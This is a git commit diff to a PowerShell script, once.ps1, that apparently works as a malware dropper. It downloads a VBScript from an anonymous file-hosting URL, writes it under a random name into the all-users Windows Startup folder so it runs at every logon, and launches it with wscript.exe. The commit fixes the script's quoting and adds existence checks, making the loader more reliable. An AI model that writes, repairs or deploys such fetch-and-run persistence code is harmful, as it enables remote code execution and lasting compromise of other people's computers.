73b1055558d666447caf846b9d4828a43ebaa8d1
anaprivate <anathike4@gmail.com>
2025-02-06 23:54:12 +0530

    Update once.ps1

--- once.ps1
+++ once.ps1
@@ -1,7 +1,19 @@
 $url = "https://files.catbox.moe/in6cm4.vbs"
-$destination = "`"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9lepqn.vbs"`"
+$destination = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9lepqn.vbs"
+
+# Ensure directory exists
+if (!(Test-Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup")) {
+    Write-Output "Error: Startup folder does not exist!"
+    exit
+}
 
 # Download the file
 Invoke-WebRequest -Uri $url -OutFile $destination
 
-Start-Process -FilePath "wscript.exe" -ArgumentList "`"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9lepqn.vbs"`" -NoNewWindow -Wait
+# Ensure the file was downloaded successfully
+if (Test-Path $destination) {
+    # Run the VBScript
+    Start-Process -FilePath "wscript.exe" -ArgumentList "`"$destination`"" -NoNewWindow -Wait
+} else {
+    Write-Output "Error: File was not downloaded!"
+}
